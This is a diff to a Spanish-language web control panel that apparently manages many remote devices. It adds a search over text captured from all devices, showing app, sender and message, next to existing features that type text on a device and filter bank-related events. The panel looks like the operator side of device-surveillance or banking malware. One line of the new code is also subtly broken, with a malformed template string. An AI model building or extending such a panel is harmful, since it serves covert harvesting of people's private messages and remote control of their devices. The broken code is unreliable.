@@ -94,7 +94,15 @@
   <div id="main">
     <div id="nodev" class="card">Selecciona un dispositivo a la izquierda.</div>
 
-    <div id="devui" style="display:none">
+        <div class="card">
+      <h3>Buscar en TODOS los dispositivos</h3>
+      <div class="row">
+        <input id="bq" placeholder="palabra clave (ej: secuestro, Neuyi, 300000)" style="flex:1;margin:0" onkeydown="if(event.key==='Enter')buscar()">
+        <button class="p" onclick="buscar()">Buscar</button>
+      </div>
+      <div id="bres" class="scroll" style="margin-top:8px"></div>
+    </div>
+<div id="devui" style="display:none">
       <div class="card">
         <h3>Dispositivo</h3>
         <div id="dinfo" class="kv"></div>
@@ -415,6 +423,22 @@ function sendTextFromModal() {
   if (t) { cmd('text', { text: t }); log('ESCRIBIR: ' + t, 'b'); }
 }
 
+async function buscar() {
+  const q = document.getElementById('bq').value.trim();
+  const box = document.getElementById('bres');
+  if (q.length < 2) { box.innerHTML = '<div class="kv">escribe al menos 2 letras</div>'; return; }
+  box.innerHTML = '<div class="kv">buscando "' + esc(q) + '" en todos los dispositivos...</div>';
+  const d = await api('/api/buscar?q=' + encodeURIComponent(q));
+  if (!d.total) { box.innerHTML = '<div class="kv">sin resultados para "' + esc(q) + '"</div>'; return; }
+  box.innerHTML = '<div class="kv">' + d.total + ' coincidencias</div>' + d.resultados.map(r => `
+    <div style="border-bottom:1px solid var(--line);padding:5px 0">
+      <span class="kv">${new Date(r.hora).toLocaleString()}</span>
+      ${r.app ? '<span class="app">' + esc(r.app) + '</span>' : ''}
+      <span class="b">' + '${esc(r.device)}' + '</span>
+      ${r.de ? '<span class="mail">' + esc(r.de) + '</span>' : ''}
+      <div class="mono">${resalta(r.texto)}</div>
+    </div>`).join('');
+}
 async function loadEvents() {
   const t = $('evtype').value;
   const solo = $('soloBanco').checked;
